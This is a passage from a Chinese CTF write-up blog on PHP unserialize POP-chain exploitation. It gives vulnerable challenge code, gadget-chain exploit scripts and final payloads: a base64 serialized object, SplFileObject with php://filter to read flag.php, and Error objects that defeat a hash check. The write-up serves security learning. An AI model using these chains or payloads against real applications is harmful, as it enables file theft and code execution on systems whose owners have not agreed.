<span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然构造链子<code>__wakeup() -&gt; __toString() -&gt; __get -&gt; __invoke()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = flag.txt;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$b</span>;<span class="comment">//通过将$b这个类当作字符串赋值，调动__toString</span></span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="keyword">new</span> <span class="title class_">Test</span>();<span class="comment">//读取不存在的$b -&gt; str -&gt; source调动__get</span></span><br><span class="line">(<span class="variable">$b</span> -&gt; str) -&gt; p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();<span class="comment">//将($b -&gt; str) -&gt; p作函数调用，调动__invoke()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//把不可打印字符编码</span></span><br></pre></td></tr></table></figure><h4 id="使用php原生类"><a href="#使用php原生类" class="headerlink" title="使用php原生类"></a>使用php原生类</h4><ol><li>例如</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[GDOUCTF 2023]反方向的钟</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一道反序列化，链子：<code>__wakeup-&gt;hahaha()-&gt;IPO()-&gt;echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);</code></p><p>然后调用php的内置类SplFileObject来读取文件内容，但是读取之后没有输出，所以使用伪协议输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> classroom;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload：</p><p><code>get:d=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=</code></p><p><code>post:a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</code></p><p>2.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[NUAACTF2022]superpop</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$variable</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;username != <span class="variable language_">$this</span>-&gt;password) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;username) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;username)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;password)) )&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;wuhu!&quot;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;variable-&gt;xxx;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;o^o&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$point</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;point;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;	</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很简单的一条pop链子，用到了Error原生类绕过hash</p><p><code>__wakeup() -&gt; __get -&gt; __invoke()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$variable</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$point</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$function</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="comment">// 方法一:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>, <span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">方法二:</span></span><br><span class="line"><span class="comment">$a = array(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">$b = array(&quot;2&quot;);</span></span><br><span class="line"><span class="comment">$user-&gt;username = $a;</span></span><br><span class="line"><span class="comment">$user-&gt;password = $b;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$read</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag&quot;</span>;</span><br><span class="line"><span class="variable">$login</span>-&gt;point = <span class="variable">$read</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;variable = <span class="variable">$login</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://gitee.com/la2y_fish/blog.git">1azy_fish.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://gitee.com/la2y_fish/blog.git/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/">https://gitee.com/la2y_fish/blog.git/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gitee.com/la2y_fish/blog.git" target="_blank">1azy_fish.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://i.ytimg.com/vi/QxuzfHLPhmI/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGDMgUCh_MA8=&amp;rs=AOn4CLDOr42OYNULHlzMX6yPFeduoFKa2w" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script 